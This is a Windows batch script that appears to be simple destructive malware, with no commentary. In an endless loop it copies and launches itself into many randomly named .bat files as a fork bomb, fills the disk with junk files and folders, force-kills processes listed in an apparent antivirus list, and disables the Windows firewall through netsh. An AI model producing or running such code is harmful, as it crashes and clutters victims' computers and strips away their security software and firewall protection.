@echo off
:main
call flood
call F_Spam
call F_Blast
call Kill_AV
call Kill_FW
goto main

:flood
set x=%random%
type %0 >> %x%.bat
start %x%.bat

:F_Spam
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% > %random%.%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% > %random%.%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% > %random%.%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% > %random%.%random%
echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random% > %random%.%random%

:F_Blast
set /A FBlast = %random%
md %FBlast%
start %FBlast%

:Kill_AV
for /f "delims=" %%a in (avs.list) do taskkill /f /im %%a

:Kill_FW
netsh firewall set opmode disable
netsh advfirewall set currentprofile state off
